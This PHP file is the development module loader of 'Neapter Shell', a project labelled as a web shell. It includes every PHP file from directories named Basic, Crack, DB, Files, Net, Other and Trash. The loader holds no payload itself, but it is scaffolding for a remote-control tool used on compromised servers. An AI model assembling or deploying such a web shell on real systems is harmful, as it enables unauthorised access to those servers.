<?php

/**
 * Neapter Shell
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */

/**
 * Load all required modules in development environment
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */
class LoadModules
{
    /**
     * Load modules in development env
     */
    public function __construct()
    {
        /* @todo, Why not Recirsive Directory Iterator and .php files? */

        $aDirectories = array(
            'Modules',
            'Modules/Basic',
            'Modules/Crack',
            'Modules/DB',
            'Modules/Files',
            'Modules/Net',
            'Modules/Other',
            'Modules/Trash',
        );

        foreach ($aDirectories as $sDir) {
            $oDirectory = new DirectoryIterator(__DIR__ . '/../' . $sDir);

            foreach ($oDirectory as $oFile) {
                if ($oFile->isFile() && $oFile->getExtension() == 'php') {
                    include_once $oFile->getPathname();
                }
            }
        }
    }
}

new LoadModules();
